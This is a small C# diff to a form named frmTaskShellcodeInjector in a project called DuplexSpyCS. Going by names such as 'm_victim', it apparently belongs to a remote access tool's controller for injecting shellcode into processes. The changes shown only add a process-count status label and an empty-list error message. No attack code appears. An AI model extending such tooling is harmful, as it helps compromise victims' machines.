@@ -62,6 +62,8 @@ namespace DuplexSpyCS
             }
 
             m_victim.m_listener.ReceivedDecoded += fnRecv;
+
+            toolStripStatusLabel1.Text = $"Process[{m_lsProc.Count}]";
         }
 
         private void frmTaskShellcodeInjector_Load(object sender, EventArgs e)
@@ -88,6 +90,12 @@ namespace DuplexSpyCS
 
         private void button2_Click(object sender, EventArgs e)
         {
+            if (m_lsProc.Count == 0)
+            {
+                MessageBox.Show("Cannot find any process.", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
             tabControl1.SelectedIndex = 1;
 
             int nMethod = comboBox1.SelectedIndex;
